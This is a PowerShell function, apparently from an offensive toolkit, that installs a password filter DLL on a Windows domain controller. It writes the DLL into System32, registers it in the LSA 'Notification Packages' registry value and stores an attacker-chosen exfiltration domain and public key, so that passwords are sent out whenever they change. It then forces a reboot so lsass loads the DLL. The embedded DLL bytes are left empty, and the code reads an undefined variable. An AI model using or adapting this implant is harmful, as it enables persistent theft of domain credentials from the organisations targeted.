function Invoke-PasswordFilterImplant {
<#
.SYNOPSIS
Registers or unregisters a password filter DLL with the domain controller that
exfiltrates credentials when a password change occurs.

.DESCRIPTION
Adds/Removes registry keys and values depending on the `Cleanup` switch. Restarts
the computer so the DLL is loaded/unloaded into memory by the lsass process.

.PARAMETER DomainValue
The domain to where you want to exfiltrate the data.

.PARAMETER Key
The base64 encoded PEM representation of the public key to use when encrypting
the data. This value should not include the PEM header and footer.

.PARAMETER DLLName
The name of the DLL (excluding the ".dll" file extension).

.PARAMETER DLLPath
Path to the System32 folder.

.SWITCH Cleanup
Switch. Set value to True if the DLL and its associated registry keys are to be
removed from the system.
#>

    [CmdletBinding()] Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [String]
    $DomainValue,

    [Parameter(Position = 1, Mandatory = $True)]
    [String]
    $Key,

    [Parameter(Position = 2, Mandatory = $True)]
    [String]
    $DLLName,

    [Parameter(Position = 3, Mandatory = $True)]
    [String]
    $DLLPath,

    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Cleanup = $False
    )

    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    $NotificationPackagesName = "Notification Packages"
    $DomainName = "Domain"
    $KeyName = "Key"
    $KeyValue = [System.Convert]::FromBase64String($Key)

    if ($Cleanup -eq $False) {

        # $PEBytes32 = ""
        $PEBytes64 = ""

        $Content = [System.Convert]::FromBase64String($Base64)
        Set-Content -Path $DLLPath"\"$DLLName".dll" -Value $Content -Encoding Byte

        New-ItemProperty -Path $registryPath -Name $DomainName -Value $DomainValue -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $registryPath -Name $KeyName -Value $KeyValue -PropertyType Binary -Force | Out-Null
        $notifPackagesValues = (Get-ItemProperty -Path $registryPath $NotificationPackagesName).$NotificationPackagesName

        if ($notifPackagesValues -notcontains $DLLName) {
            $notifPackagesValues += $DLLName
            Set-ItemProperty $registryPath $NotificationPackagesName -value $notifPackagesValues -Type MultiString
        }

        Restart-Computer
    } else {

        $notifPackagesValues = (Get-ItemProperty -Path $registryPath $NotificationPackagesName).$NotificationPackagesName
        if($notifPackagesValues -contains $DLLName){
            Set-ItemProperty $registryPath $NotificationPackagesName -value ($notifPackagesValues -ne $DLLName) -Type MultiString
            Remove-Item "$DLLPath\$DLLName"
        }

        Remove-ItemProperty -Path $registryPath -Name $DomainName -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $registryPath -Name $KeyName -ErrorAction SilentlyContinue
        Restart-Computer
    }
}
